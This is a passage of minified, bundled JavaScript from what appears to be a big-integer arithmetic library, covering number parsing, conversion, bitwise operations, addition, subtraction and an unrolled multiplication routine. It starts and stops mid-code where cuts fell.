v=0;y[0]==="-"&&(v++,this.negative=1),v<y.length&&(A===16?this._parseHex(y,v,b):(this._parseBase(y,A,v),b==="le"&&this._initArray(this.toArray(),A,b)))},s.prototype._initNumber=function(y,A,b){y<0&&(this.negative=1,y=-y),y<67108864?(this.words=[y&67108863],this.length=1):y<4503599627370496?(this.words=[y&67108863,y/67108864&67108863],this.length=2):(i(y<9007199254740992),this.words=[y&67108863,y/67108864&67108863,1],this.length=3),b==="le"&&this._initArray(this.toArray(),A,b)},s.prototype._initArray=function(y,A,b){if(i(typeof y.length=="number"),y.length<=0)return this.words=[0],this.length=1,this;this.length=Math.ceil(y.length/3),this.words=new Array(this.length);for(var v=0;v<this.length;v++)this.words[v]=0;var _,O,D=0;if(b==="be")for(v=y.length-1,_=0;v>=0;v-=3)O=y[v]|y[v-1]<<8|y[v-2]<<16,this.words[_]|=O<<D&67108863,this.words[_+1]=O>>>26-D&67108863,D+=24,D>=26&&(D-=26,_++);else if(b==="le")for(v=0,_=0;v<y.length;v+=3)O=y[v]|y[v+1]<<8|y[v+2]<<16,this.words[_]|=O<<D&67108863,this.words[_+1]=O>>>26-D&67108863,D+=24,D>=26&&(D-=26,_++);return this.strip()};function a($,y){var A=$.charCodeAt(y);return A>=65&&A<=70?A-55:A>=97&&A<=102?A-87:A-48&15}function c($,y,A){var b=a($,A);return A-1>=y&&(b|=a($,A-1)<<4),b}s.prototype._parseHex=function(y,A,b){this.length=Math.ceil((y.length-A)/6),this.words=new Array(this.length);for(var v=0;v<this.length;v++)this.words[v]=0;var _=0,O=0,D;if(b==="be")for(v=y.length-1;v>=A;v-=2)D=c(y,A,v)<<_,this.words[O]|=D&67108863,_>=18?(_-=18,O+=1,this.words[O]|=D>>>26):_+=8;else{var R=y.length-A;for(v=R%2===0?A+1:A;v<y.length;v+=2)D=c(y,A,v)<<_,this.words[O]|=D&67108863,_>=18?(_-=18,O+=1,this.words[O]|=D>>>26):_+=8}this.strip()};function l($,y,A,b){for(var v=0,_=Math.min($.length,A),O=y;O<_;O++){var D=$.charCodeAt(O)-48;v*=b,D>=49?v+=D-49+10:D>=17?v+=D-17+10:v+=D}return v}s.prototype._parseBase=function(y,A,b){this.words=[0],this.length=1;for(var v=0,_=1;_<=67108863;_*=A)v++;v--,_=_/A|0;for(var O=y.length-b,D=O%v,R=Math.min(O,O-D)+b,P=0,B=b;B<R;B+=v)P=l(y,B,B+v,A),this.imuln(_),this.words[0]+P<67108864?this.words[0]+=P:this._iaddn(P);if(D!==0){var M=1;for(P=l(y,B,y.length,A),B=0;B<D;B++)M*=A;this.imuln(M),this.words[0]+P<67108864?this.words[0]+=P:this._iaddn(P)}this.strip()},s.prototype.copy=function(y){y.words=new Array(this.length);for(var A=0;A<this.length;A++)y.words[A]=this.words[A];y.length=this.length,y.negative=this.negative,y.red=this.red},s.prototype.clone=function(){var y=new s(null);return this.copy(y),y},s.prototype._expand=function(y){for(;this.length<y;)this.words[this.length++]=0;return this},s.prototype.strip=function(){for(;this.length>1&&this.words[this.length-1]===0;)this.length--;return this._normSign()},s.prototype._normSign=function(){return this.length===1&&this.words[0]===0&&(this.negative=0),this},s.prototype.inspect=function(){return(this.red?"<BN-R: ":"<BN: ")+this.toString(16)+">"};var u=["","0","00","000","0000","00000","000000","0000000","00000000","000000000","0000000000","00000000000","000000000000","0000000000000","00000000000000","000000000000000","0000000000000000","00000000000000000","000000000000000000","0000000000000000000","00000000000000000000","000000000000000000000","0000000000000000000000","00000000000000000000000","000000000000000000000000","0000000000000000000000000"],d=[0,0,25,16,12,11,10,9,8,8,7,7,7,7,6,6,6,6,6,6,6,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5],h=[0,0,33554432,43046721,16777216,48828125,60466176,40353607,16777216,43046721,1e7,19487171,35831808,62748517,7529536,11390625,16777216,24137569,34012224,47045881,64e6,4084101,5153632,6436343,7962624,9765625,11881376,14348907,17210368,20511149,243e5,28629151,33554432,39135393,45435424,52521875,60466176];s.prototype.toString=function(y,A){y=y||10,A=A|0||1;var b;if(y===16||y==="hex"){b="";for(var v=0,_=0,O=0;O<this.length;O++){var D=this.words[O],R=((D<<v|_)&16777215).toString(16);_=D>>>24-v&16777215,v+=2,v>=26&&(v-=26,O--),_!==0||O!==this.length-1?b=u[6-R.length]+R+b:b=R+b}for(_!==0&&(b=_.toString(16)+b);b.length%A!==0;)b="0"+b;return this.negative!==0&&(b="-"+b),b}if(y===(y|0)&&y>=2&&y<=36){var P=d[y],B=h[y];b="";var M=this.clone();for(M.negative=0;!M.isZero();){var W=M.modn(B).toString(y);M=M.idivn(B),M.isZero()?b=W+b:b=u[P-W.length]+W+b}for(this.isZero()&&(b="0"+b);b.length%A!==0;)b="0"+b;return this.negative!==0&&(b="-"+b),b}i(!1,"Base should be between 2 and 36")},s.prototype.toNumber=function(){var y=this.words[0];return this.length===2?y+=this.words[1]*67108864:this.length===3&&this.words[2]===1?y+=4503599627370496+this.words[1]*67108864:this.length>2&&i(!1,"Number can only safely store up to 53 bits"),this.negative!==0?-y:y},s.prototype.toJSON=function(){return this.toString(16)},s.prototype.toBuffer=function(y,A){return i(typeof o<"u"),this.toArrayLike(o,y,A)},s.prototype.toArray=function(y,A){return this.toArrayLike(Array,y,A)},s.prototype.toArrayLike=function(y,A,b){var v=this.byteLength(),_=b||Math.max(1,v);i(v<=_,"byte array longer than desired length"),i(_>0,"Requested array length <= 0"),this.strip();var O=A==="le",D=new y(_),R,P,B=this.clone();if(O){for(P=0;!B.isZero();P++)R=B.andln(255),B.iushrn(8),D[P]=R;for(;P<_;P++)D[P]=0}else{for(P=0;P<_-v;P++)D[P]=0;for(P=0;!B.isZero();P++)R=B.andln(255),B.iushrn(8),D[_-P-1]=R}return D},Math.clz32?s.prototype._countBits=function(y){return 32-Math.clz32(y)}:s.prototype._countBits=function(y){var A=y,b=0;return A>=4096&&(b+=13,A>>>=13),A>=64&&(b+=7,A>>>=7),A>=8&&(b+=4,A>>>=4),A>=2&&(b+=2,A>>>=2),b+A},s.prototype._zeroBits=function(y){if(y===0)return 26;var A=y,b=0;return(A&8191)===0&&(b+=13,A>>>=13),(A&127)===0&&(b+=7,A>>>=7),(A&15)===0&&(b+=4,A>>>=4),(A&3)===0&&(b+=2,A>>>=2),(A&1)===0&&b++,b},s.prototype.bitLength=function(){var y=this.words[this.length-1],A=this._countBits(y);return(this.length-1)*26+A};function f($){for(var y=new Array($.bitLength()),A=0;A<y.length;A++){var b=A/26|0,v=A%26;y[A]=($.words[b]&1<<v)>>>v}return y}s.prototype.zeroBits=function(){if(this.isZero())return 0;for(var y=0,A=0;A<this.length;A++){var b=this._zeroBits(this.words[A]);if(y+=b,b!==26)break}return y},s.prototype.byteLength=function(){return Math.ceil(this.bitLength()/8)},s.prototype.toTwos=function(y){return this.negative!==0?this.abs().inotn(y).iaddn(1):this.clone()},s.prototype.fromTwos=function(y){return this.testn(y-1)?this.notn(y).iaddn(1).ineg():this.clone()},s.prototype.isNeg=function(){return this.negative!==0},s.prototype.neg=function(){return this.clone().ineg()},s.prototype.ineg=function(){return this.isZero()||(this.negative^=1),this},s.prototype.iuor=function(y){for(;this.length<y.length;)this.words[this.length++]=0;for(var A=0;A<y.length;A++)this.words[A]=this.words[A]|y.words[A];return this.strip()},s.prototype.ior=function(y){return i((this.negative|y.negative)===0),this.iuor(y)},s.prototype.or=function(y){return this.length>y.length?this.clone().ior(y):y.clone().ior(this)},s.prototype.uor=function(y){return this.length>y.length?this.clone().iuor(y):y.clone().iuor(this)},s.prototype.iuand=function(y){var A;this.length>y.length?A=y:A=this;for(var b=0;b<A.length;b++)this.words[b]=this.words[b]&y.words[b];return this.length=A.length,this.strip()},s.prototype.iand=function(y){return i((this.negative|y.negative)===0),this.iuand(y)},s.prototype.and=function(y){return this.length>y.length?this.clone().iand(y):y.clone().iand(this)},s.prototype.uand=function(y){return this.length>y.length?this.clone().iuand(y):y.clone().iuand(this)},s.prototype.iuxor=function(y){var A,b;this.length>y.length?(A=this,b=y):(A=y,b=this);for(var v=0;v<b.length;v++)this.words[v]=A.words[v]^b.words[v];if(this!==A)for(;v<A.length;v++)this.words[v]=A.words[v];return this.length=A.length,this.strip()},s.prototype.ixor=function(y){return i((this.negative|y.negative)===0),this.iuxor(y)},s.prototype.xor=function(y){return this.length>y.length?this.clone().ixor(y):y.clone().ixor(this)},s.prototype.uxor=function(y){return this.length>y.length?this.clone().iuxor(y):y.clone().iuxor(this)},s.prototype.inotn=function(y){i(typeof y=="number"&&y>=0);var A=Math.ceil(y/26)|0,b=y%26;this._expand(A),b>0&&A--;for(var v=0;v<A;v++)this.words[v]=~this.words[v]&67108863;return b>0&&(this.words[v]=~this.words[v]&67108863>>26-b),this.strip()},s.prototype.notn=function(y){return this.clone().inotn(y)},s.prototype.setn=function(y,A){i(typeof y=="number"&&y>=0);var b=y/26|0,v=y%26;return this._expand(b+1),A?this.words[b]=this.words[b]|1<<v:this.words[b]=this.words[b]&~(1<<v),this.strip()},s.prototype.iadd=function(y){var A;if(this.negative!==0&&y.negative===0)return this.negative=0,A=this.isub(y),this.negative^=1,this._normSign();if(this.negative===0&&y.negative!==0)return y.negative=0,A=this.isub(y),y.negative=1,A._normSign();var b,v;this.length>y.length?(b=this,v=y):(b=y,v=this);for(var _=0,O=0;O<v.length;O++)A=(b.words[O]|0)+(v.words[O]|0)+_,this.words[O]=A&67108863,_=A>>>26;for(;_!==0&&O<b.length;O++)A=(b.words[O]|0)+_,this.words[O]=A&67108863,_=A>>>26;if(this.length=b.length,_!==0)this.words[this.length]=_,this.length++;else if(b!==this)for(;O<b.length;O++)this.words[O]=b.words[O];return this},s.prototype.add=function(y){var A;return y.negative!==0&&this.negative===0?(y.negative=0,A=this.sub(y),y.negative^=1,A):y.negative===0&&this.negative!==0?(this.negative=0,A=y.sub(this),this.negative=1,A):this.length>y.length?this.clone().iadd(y):y.clone().iadd(this)},s.prototype.isub=function(y){if(y.negative!==0){y.negative=0;var A=this.iadd(y);return y.negative=1,A._normSign()}else if(this.negative!==0)return this.negative=0,this.iadd(y),this.negative=1,this._normSign();var b=this.cmp(y);if(b===0)return this.negative=0,this.length=1,this.words[0]=0,this;var v,_;b>0?(v=this,_=y):(v=y,_=this);for(var O=0,D=0;D<_.length;D++)A=(v.words[D]|0)-(_.words[D]|0)+O,O=A>>26,this.words[D]=A&67108863;for(;O!==0&&D<v.length;D++)A=(v.words[D]|0)+O,O=A>>26,this.words[D]=A&67108863;if(O===0&&D<v.length&&v!==this)for(;D<v.length;D++)this.words[D]=v.words[D];return this.length=Math.max(this.length,D),v!==this&&(this.negative=1),this.strip()},s.prototype.sub=function(y){return this.clone().isub(y)};function p($,y,A){A.negative=y.negative^$.negative;var b=$.length+y.length|0;A.length=b,b=b-1|0;var v=$.words[0]|0,_=y.words[0]|0,O=v*_,D=O&67108863,R=O/67108864|0;A.words[0]=D;for(var P=1;P<b;P++){for(var B=R>>>26,M=R&67108863,W=Math.min(P,y.length-1),K=Math.max(0,P-$.length+1);K<=W;K++){var q=P-K|0;v=$.words[q]|0,_=y.words[K]|0,O=v*_+M,B+=O/67108864|0,M=O&67108863}A.words[P]=M|0,R=B|0}return R!==0?A.words[P]=R|0:A.length--,A.strip()}var g=function(y,A,b){var v=y.words,_=A.words,O=b.words,D=0,R,P,B,M=v[0]|0,W=M&8191,K=M>>>13,q=v[1]|0,J=q&8191,le=q>>>13,ae=v[2]|0,U=ae&8191,G=ae>>>13,Z=v[3]|0,j=Z&8191,Y=Z>>>13,se=v[4]|0,ne=se&8191,Te=se>>>13,Re=v[5]|0,$e=Re&8191,Ae=Re>>>13,De=v[6]|0,Le=De&8191,it=De>>>13,nt=v[7]|0,ct=nt&8191,St=nt>>>13,zt=v[8]|0,Q=zt&8191,z=zt>>>13,H=v[9]|0,ie=H&8191,pe=H>>>13,we=_[0]|0,_e=we&8191,et=we>>>13,yt=_[1]|0,Ye=yt&8191,$t=yt>>>13,xt=_[2]|0,Mt=xt&8191,Pr=xt>>>13,Ur=_[3]|0,Vt=Ur&8191,jr=Ur>>>13,Br=_[4]|0,Ct=Br&8191,er=Br>>>13,tr=_[5]|0,mt=tr&8191,or=tr>>>13,ar=_[6]|0,It=ar&8191,cr=ar>>>13,lr=_[7]|0,At=lr&8191,rr=lr>>>13,Kt=_[8]|0,wt=Kt&8191,ir=Kt>>>13,ur=_[9]|0,Tt=ur&8191,ui=ur>>>13;b.negative=y.negative^A.negative,b.length=19,R=Math.imul(W,_e),P=Math.imul(W,et),P=P+Math.imul(K,_e)|0,B=Math.imul(K,et);var Ar=(D+R|0)+((P&8191)<<13)|0;D=(B+(P>>>13)|0)+(Ar>>>26)|0,Ar&=67108863,R=Math.imul(J,_e),P=Math.imul(J,et),P=P+Math.imul(le,_e)|0,B=Math.imul(le,et),R=R+Math.imul(W,Ye)|0,P=P+Math.imul(W,$t)|0,P=P+Math.imul(K,Ye)|0,B=B+Math.imul(K,$t)|0;var ri=(D+R|0)+((P&8191)<<13)|0;D=(B+(P>>>13)|0)+(ri>>>26)|0,ri&=67108863,R=Math.imul(U,_e),P=Math.imul(U,et),P=P+Math.imul(G,_e)|0,B=Math.imul(G,et),R=R+Math.imul(J,Ye)|0,P=P+Math.imul(J,$t)|0,P=P+Math.imul(le,Ye)|0,B=B+Math.imul(le,$t)|0,R=R+Math.imul(W,Mt)|0,P=P+Math.imul(W,Pr)|0,P=P+Math.imul(K,Mt)|0,B=B+Math.imul(K,Pr)|0;var qn=(D+R|0)+((P&8191)<<13)|0;D=(B+(P>>>13)|0)+(qn>>>26)|0,qn&=67108863,R=Math.imul(j,_e),P=Math.imul(j,et),P=P+Math.imul(Y,_e)|0,B=Math.imul(Y,et),R=R+Math.imul(U,Ye)|0,P=P+Math.imul(U,$t)|0,P=P+Math.imul(G,Ye)|0,B=B+Math.imul(G,$t)|0,R=R+Math.imul(J,Mt)|0,P=P+Math.imul(J,Pr)|0,P=P+Math.imul(le,Mt)|0,B=B+Math.imul(le,Pr)|0,R=R+Math.imul(W,Vt)|0,P=P+Math.imul(W,jr)|0,P=P+Math.imul(K,Vt)|0,B=B+Math.imul(K,jr)|0;var yo=(D+R|0)+((P&8191)<<13)|0;D=(B+(P>>>13)|0)+(yo>>>26)|0,yo&=67108863,R=Math.imul(ne,_e),P=Math.imul(ne,et),P=P+Math.imul(Te,_e)|0,B=Math.imul(Te,et),R=R+Math.imul(j,Ye)|0,P=P+Math.imul(j,$t)|0,P=P+Math.imul(Y,Ye)|0,B=B+Math.imul(Y,$t)|0,R=R+Math.imul(U,Mt)|0,P=P+Math.imul(U,Pr)|0,P=P+Math.imul(G,Mt)|0,B=B+Math.imul(G,Pr)|0,R=R+Math.imul(J,Vt)|0,P=P+Math.imul(J,jr)|0,P=P+Math.imul(le,Vt)|0,B=B+Math.imul(le,jr)|0,R=R+Math.imul(W,Ct)|0,P=P+Math.imul(W,er)|0,P=P+Math.imul(K,Ct)|0,B=B+Math.imul(K,er)|0;var xo=(D+R|0)+((P&8191)<<13)|0;D=(B+(P>>>13)|0)+(xo>>>26)|0,xo&=67108863,R=Math.imul($e,_e),P=Math.imul($e,et),P=P+Math.imul(Ae,_e)|0,B=Math.imul(Ae,et),R=R+Math.imul(ne,Ye)|0,P=P+Math.imul(ne,$t)|0,P=P+Math.imul(Te,Ye)|0,B=B+Math.imul(Te,$t)|0,R=R+Math.imul(j,Mt)|0,P=P+Math.imul(j,Pr)|0,P=P+Math.imul(Y,Mt)|0,B=B+Math.imul(Y,Pr)|0,R=R+Math.imul(U,Vt)|0,P=P+Math.imul(U,jr)|0,P=P+Math.imul(G,Vt)|0,B=B+Math.imul(G,jr)|0,R=R+Math.imul(J,Ct)|0,P=P+Math.imul(J,er)|0,P=P+Math.imul(le,Ct)|0,B=B+Math.imul(le,er)|0,R=R+Math.imul(W,mt)|0,P=P+Math.imul(W,or)|0,P=P+Math.imul(K,mt)|0,B=B+Math.imul(K,or)|0;var Co=(D+R|0)+((P&8191)<<13)|0;D=(B+(P>>>13)|0)+(Co>>>26)|0,Co&=67108863,R=Math.imul(Le,_e),P=Math.imul(Le,et),P=P+Math.imul(it,_e)|0,B=Math.imul(it,et),R=R+Math.imul($e,Ye)|0,P=P+Math.imul($e,$t)|0,P=P+Math.imul(Ae,Ye)|0,B=B+Math.imul(Ae,$t)|0,R=R+Math.imul(ne,Mt)|0,P=P+Math.imul(ne,Pr)|0,P=P+Math.imul(Te,Mt)|0,B=B+Math.imul(Te,Pr)|0,R=R+Math.imul(j,Vt)|0,P=P+Math.imul(j,jr)|0,P=P+Math.imul(Y,Vt)|0,B=B+Math.imul(Y,jr)|0,R=R+Math.imul(U,Ct)|0,P=P+Math.imul(U,er)|0,P=P+Math.imul(G,Ct)|0,B=B+Math.imul(G,er)|0,R=R+Math.imul(J,mt)|0,P=P+Math.imul(J,or)|0,P=P+Math.imul(le,mt)|0,B=B+Math.imul(le,or)|0,R=R+Math.imul(W,It)|0,P=P+Math.imul(W,cr)|0,P=P+Math.imul(K,It)|0,B=B+Math.imul(K,cr)|0;var Rn=(D+R|0)+((P&8191)<<13)|0;D=(B+(P>>>13)|0)+(Rn>>>26)|0,Rn&=67108863,R=Math.imul(ct,_e),P=Math.imul(ct,et),P=P+Math.imul(St,_e)|0,B=Math.imul(St,et),R=R+Math.imul(Le,Ye)|0,P=P+Math.imul(Le,$t)|0,P=P+Math.imul(it,Ye)|0,B=B+Math.imul(it,$t)|0,R=R+Math.imul($e,Mt)|0,P=P+Math.imul($e,Pr)|0,P=P+Math.imul(Ae,Mt)|0,B=B+Math.imul(Ae,Pr)|0,R=R+Math.imul(ne,Vt)|0,P=P+Math.imul(ne,jr)|0,P=P+Math.imul(Te,Vt)|0,B=B+Math.imul(Te,jr)|0,R=R+Math.imul(j,Ct)|0,P=P+Math.imul(j,er)|0,P=P+Math.imul(Y,Ct)|0,B=B+Math.imul(Y,er)|0,R=R+Math.imul(U,mt)|0,P=P+Math.imul(U,or)|0,P=P+Math.imul(G,mt)|0,B=B+Math.imul(G,or)|0,R=R+Math.imul(J,It)|0,P=P+Math.imul(J,cr)|0,P=P+Math.imul(le,It)|0,B=B+Math.imul(le,cr)|0,R=R+Math.imul(W,At)|0,P=P+Math.imul(W,rr)|0,P=P+Math.imul(K,At)|0,B=B+Math.imul(K,rr)|0;var Al=(D+R|0)+((P&8191)<<13)|0;D=(B+(P>>>13)|0)+(Al>>>26)|0,Al&=67108863,R=Math.imul(Q,_e),P=Math.imul(Q,et),P=P+Math.imul(z,_e)|0,B=Math.imul(z,et),R=R+Math.imul(ct,Ye)|0,P=P+Math.imul(ct,$t)|0,P=P+Math.imul(St,Ye)|0,B=B+Math.imul(St,$t)|0,R=R+Math.imul(Le,Mt)|0,P=P+Math.imul(Le,Pr)|0,P=P+Math.imul(it,Mt)|0,B=B+Math.imul(it,Pr)|0,R=R+Math.imul($e,Vt)|0,P=P+Math.imul($e,jr)|0,P=P+Math.imul(Ae,Vt)|0,B=B+Math.imul(Ae,jr)|0,R=R+Math.imul(ne,Ct)|0,P=P+Math.imul(ne,er)|0,P=P+Math.imul(Te,Ct)|0,B=B+Math.imul(Te,er)|0,R=R+Math.imul(j,mt)|0,P=P+Math.imul(j,or)|0,P=P+Math.imul(Y,mt)|0,B=B+Math.imul(Y,or)|0,R=R+Math.imul(U,It)|0,P=P+Math.imul(U,cr)|0,P=P+Math.imul(G,It)|0,B=B+Math.imul(G,cr)|0,R=R+Math.imul(J,At)|0,P=P+Math.imul(J,rr)|0,P=P+Math.imul(le,At)|0,B=B+Math.imul(le,rr)|0,R=R+Math.imul(W,wt)|0,P=P+Math.imul(W,ir)|0,P=P+Math.imul(K,wt)|0,B=B+Math.imul(K,ir)|0;var Il=(D+R|0)+((P&8191)<<13)|0;D=(B+(P>>>13)|0)+(Il>>>26)|0,Il&=67108863,R=Math.imul(ie,_e),P=Math.imul(ie,et),P=P+Math.imul(pe,_e)|0,B=Math.imul(pe,et),R=R+Math.imul(Q,Ye)|0,P=P+Math.imul(Q,$t)|0,P=P+Math.imul(z,Ye)|0,B=B+Math.imul(z,$t)|0,R=R+Math.imul(ct,Mt)|0,P=P+Math.imul(ct,Pr)|0,P=P+Math.imul(St,Mt)|0,B=B+Math.imul(St,Pr)|0,R=R+Math.imul(Le,Vt)|0,P=P+Math.imul(Le,jr)|0,P=P+Math.imul(it,Vt)|0,B=B+Math.imul(it,jr)|0,R=R+Math.imul($e,Ct)|0,P=P+Math.imul($e,er)|0,P=P+Math.imul(Ae,Ct)|0,B=B+Math.imul(Ae,er)|0,R=R+Math.imul(ne,mt)|0,P=P+Math.imul(ne,or)|0,P=P+Math.imul(Te,mt)|0,B=B+Math.imul(Te,or)|0,R=R+Math.imul(j,It)|0,P=P+Math.imul(j,cr)|0,P=P+Math.imul(Y,It)|0,B=B+Math.imul(Y,cr)|0,R=R+Math.imul(U,At)|0,P=P+Math.imul(U,rr)|0,P=P+Math.imul(G,At)|0,B=B+Math.imul(G,rr)|0,R=R+Math.imul(J,wt)|0,P=P+Math.imul(J,ir)|0,P=P+Math.imul(le,wt)|0,B=B+Math.imul(le,ir)|0,R=R+Math.imul(W,Tt)|0,P=P+Math.imul(W,ui)|0,P=P+Math.imul(K,Tt)|0,B=B+Math.imul(K,ui)|0;var Tl=(D+R|0)+((P&8191)<<13)|0;D=(B+(P>>>13)|0)+(Tl>>>26)|0,Tl&=67108863,R=Math.imul(ie,Ye),P=Math.imul(ie,$t),P=P+Math.imul(pe,Ye)|0,B=Math.imul(pe,$t),R=R+Math.imul(Q,Mt)|0,P=P+Math.imul(Q,Pr)|0,P=P+Math.imul(z,Mt)|0,B=B+Math.imul(z,Pr)|0,R=R+Math.imul(ct,Vt)|0,P=P+Math.imul(ct,jr)|0,P=P+Math.imul(St,Vt)|0,B=B+Math.imul(St,jr)|0,R=R+Math.imul(Le,Ct)|0,P=P+Math.imul(Le,er)|0,P=P+Math.imul(it,Ct)|0,B=B+Math.imul(it,er)|0,R=R+Math.imul($e,mt)|0,P=P+Math.imul($e,or)|0,P=P+Math.imul(Ae,mt)|0,B=B+Math.imul(Ae,or)|0,R=R+Math.imul(ne,It)|0,P=P+Math.imul(ne,cr)|0,P=P+Math.imul(Te,It)|0,B=B+Math.imul(Te,cr)|0,R=R+Math.imul(j,At)|0,P=P+Math.imul(j,rr)|0,P=P+Math.imul(Y,At)|0,B=B+Math.imul(Y,rr)|0,R=R+Math.imul(U,wt)|0,P=P+Math.imul(U,ir)|0,P=P+Math.imul(G,wt)|0,B=B+Math.imul(G,ir)|0,R=R+Math.imul(J,Tt)|0,P=P+Math.imul(J,ui)|0,P=P+Math.imul(le,Tt)|0,B=B+Math.imul(le,ui)|0;var kl=(D+R|0)+((P&8191)<<13)|0;D=(B+(P>>>13)|0)+(kl>>>26)|0,kl&=67108863,R=Math.imul(ie,Mt),P=Math.imul(ie,Pr),P=P+Math.imul(pe,Mt)|0,B=Math.imul(pe,Pr),R=R+Math.imul(Q,Vt)|0,P=P+Math.imul(Q,jr)|0,P=P+Math.imul(z,Vt)|0,B=B+Math.imul(z,jr)|0,R=R+Math.imul(ct,Ct)|0,P=P+Math.imul(ct,er)|0,P=P+Math.imul(St,Ct)|0,B=B+Math.imul(St,er)|0,R=R+Math.imul(Le,mt)|0,P=P+Math.imul(Le,or)|0,P=P+Math.imul(it,mt)|0,B=B+Math.imul(it,or)|0,R=R+Math.imul($e,It)|0,P=P+Math.imul($e,cr)|0,P=P+Math.imul(Ae,It)|0,B=B+Math.imul(Ae,cr)|0,R=R+Math.imul(ne,At)|0,P=P+Math.imul(ne,rr)|0,P=P+Math.imul(Te,At)|0,B=B+Math.imul(Te,rr)|0,R=R+Math.imul(j,wt)|0,P=P+Math.imul(j,ir)|0,P=P+Math.imul(Y,wt)|0,B=B+Math.imul(Y,ir)|0,R=R+Math.imul(U,Tt)|0,P=P+Math.imul(U,ui)|0,P=P+Math.imul(G,Tt)|0,B=B+Math.imul(G,ui)|0;var Nl=(D+R|0)+((P&8191)<<13)|0;D=(B+(P>>>13)|0)+(Nl>>>26)|0,Nl&=67108863,R=Math.imul(ie,Vt),P=Math.imul(ie,jr),P=P+Math.imul(pe,Vt)|0,B=Math.imul(pe,jr),R=R+Math.imul(Q,Ct)|0,P=P+Math.imul(Q,er)|0,P=P+Math.imul(z,Ct)|0,B=B+Math.imul(z,er)|0,R=R+Math.imul(ct,mt)|0,P=P+Math.imul(ct,or)|0,P=P+Math.imul(St,mt)|0,B=B+Math.imul(St,or)|0,R=R+Math.imul(Le,It)|0,P=P+Math.imul(Le,cr)|0,P=P+Math.imul(it,It)|0,B=B+Math.imul(it,cr)|0,R=R+Math.imul($e,At)|0,P=P+Math.imul($e,rr)|0,P=P+Math.imul(Ae,At)|0,B=B+Math.imul(Ae,rr)|0,R=R+Math.imul(ne,wt)|0,P=P+Math.imul(ne,ir)|0,P=P+Math.imul(Te,wt)|0,B=B+Math.imul(Te,ir)|0,R=R+Math.imul(j,Tt)|0,P=P+Math.imul(j,ui)|0,P=P+Math.imul(Y,Tt)|0,B=B+Math.imul(Y,ui)|0;var yn=(D+R|0)+((P&8191)<<13)|0;D=(B+(P>>>13)|0)+(yn>>>26)|0,yn&=67108863,R=Math.imul(ie,Ct),P=Math.imul(ie,er),P=P+Math.imul(pe,Ct)|0,B=Math.imul(pe,er),R=R+Math.imul(Q,mt)|0,P=P+Math.imul(Q,or)|0,P=P+Math.imul(z,mt)|0,B=B+Math.imul(z,or)|0,R=R+Math.imul(ct,It)|0,P=P+Math.imul(ct,cr)|0,P=P+Math.imul(St,It)|0,B=B+Math.imul(St,cr)|0,R=R+Math.imul(Le,At)|0,P=P+Math.imul(Le,rr)|0,P=P+Math.imul(it,At)|0,B=B+Math.imul(it,rr)|0,R=R+Math.imul($e,wt)|0,P=P+Math.imul($e,ir)|0,P=P+Math.imul(Ae,wt)|0,B=B+Math.imul(Ae,ir)|0,R=R+Math.imul(ne,Tt)|0,P=P+Math.imul(ne,ui)|0,P=P+Math.imul(Te,Tt)|0,B=B+Math.imul(Te,ui)|0;var Pl=(D+R|0)+((P&8191)<<13)|0;D=(B+(P>>>13)|0)+(Pl>>>26)|0,Pl&=67108863,R=Math.imul(ie,mt),P=Math.imul(ie,or),P=P+Math.imul(pe,mt)|0,B=Math.imul(pe,or),R=R+Math.imul(Q,It)|0,P=P+Math.imul(Q,cr)|0,P=P+Math.imul(z,It)|0,B=B+Math.imul(z,cr)|0,R=R+Math.imul(ct,At)|0,P=P+Math.imul(ct,rr)|0,P=P+Math.imul(St,At)|0,B=B+Math.imul(St,rr)|0,R=R+Math.imul(Le,wt)|0,P=P+Math.imul(Le,ir)|0,P=P+Math.imul(it,wt)|0,B=B+Math.imul(it,ir)|0,R=R+Math.imul($e,Tt)|0,P=P+Math.imul($e,ui)|0,P=P+Math.imul(Ae,Tt)|0,B=B+Math.imul(Ae,ui)|0;var $l=(D+R|0)+((P&8191)<<13)|0;D=(B+(P>>>13)|0)+($l>>>26)|0,$l&=67108863,R=Math.imul(ie,It),P=Math.imul(ie,cr),P=P+Math.imul(pe,It)|0,B=Math.imul(pe,cr),R=R+Math.imul(Q,At)|0,P=P+Math.imul(Q,rr)|0,P=P+Math.imul(z,At)|0,B=B+Math.imul(z,rr)|0,R=R+Math.imul(ct,wt)|0,P=P+Math.imul(ct,ir)|0,P=P+Math.imul(St,wt)|0,B=B+Math.imul(St,ir)|0,R=R+Math.imul(Le,Tt)|0,P=P+Math.imul(Le,ui)|0,P=P+Math.imul(it,Tt)|0,B=B+Math.imul(it,ui)|0;var Ts=(D+R|0)+((P&8191)<<13)|0;D=(B+(P>>>13)|0)+(Ts>>>26)|0,Ts&=67108863,R=Math.imul(ie,At),P=Math.imul(ie,rr),P=P+Math.imul(pe,At)|0,B=Math.imul(pe,rr),R=R+Math.imul(Q,wt)|0,P=P+Math.imul(Q,ir)|0,P=P+Math.imul(z,wt)|0,B=B+Math.imul(z,ir)|0,R=R+Math.imul(ct,Tt)|0,P=P+Math.imul(ct,ui)|0,P=P+Math.imul(St,Tt)|0,B=B+Math.imul(St,ui)|0;var Rl=(D+R|0)+((P&8191)<<13)|0;D=(B+(P>>>13)|0)+(Rl>>>26)|0,Rl&=67108863,R=Math.imul(ie,wt),P=Math.imul(ie,ir),P=P+Math.imul(pe,wt)|0,B=Math.imul(pe,ir),R=R+Math.imul(Q,Tt)|0,P=P+Math.imul(Q,ui)|0,P=P+Math.imul(z,Tt)|0,B=B+Math.imul(z,ui)|0;var X=(D+R|0)+((P&8191)<<13)|0;D=(B+(P>>>13)|0)+(X>>>26)|0,X&=67108863,R=Math.imul(ie,Tt),P=Math.imul(ie,ui),P=P+Math.imul(pe,Tt)|0,B=Math.imul(pe,ui);var ee=(D+R|0)+((P&8191)<<13)|0;return D=(B+(P>>>13)|0)+(ee>>>26)|0,ee&=67108863,O[0]=Ar,O[1]=ri,O[2]=qn,O[3]=yo,O[4]=xo,O[5]=Co,O[6]=Rn,O[7]=Al,O[8]=Il,O[9]=Tl,O[10]=kl,O[11]=Nl,O[12]=yn,O[13]=Pl,O[14]=$l,O[15]=Ts,O[16]=Rl,O[17]=X,O[18]=ee,D!==0&&(O[19]=D,b.length++),b};Math.imul||(g=p);function w($,y,A){A.negative=y.negative^$.negative,A.length=$.length+y.length;for(var b=0,v=0,_=0;_<A.length-1;_++){var O=v;v=0;for(var D=b&67108863,R=Math.min(_,y.length-1),P=Math.max(0,_-$.length+1);P<=R;P++){var 